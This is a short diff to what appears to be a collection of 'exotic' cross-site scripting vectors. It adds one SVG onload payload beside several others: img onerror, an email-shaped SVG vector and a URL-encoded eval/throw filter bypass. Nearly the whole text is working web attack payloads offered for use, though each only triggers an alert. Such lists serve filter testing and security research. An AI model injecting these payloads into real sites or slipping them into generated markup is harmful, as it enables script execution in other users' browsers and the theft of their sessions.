@@ -8,6 +8,8 @@ I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTO
 ```
 “><svg/onload=alert(document.domain)>”@x.y
 
+<svg onload="alert(1)" <="" svg=""
+
 „> <img src = x onerror = javascript: alert (1); …
 
 onerror%3Deval%3Bthrow'%3Dalert%5Cx281%5Cx29'%3B
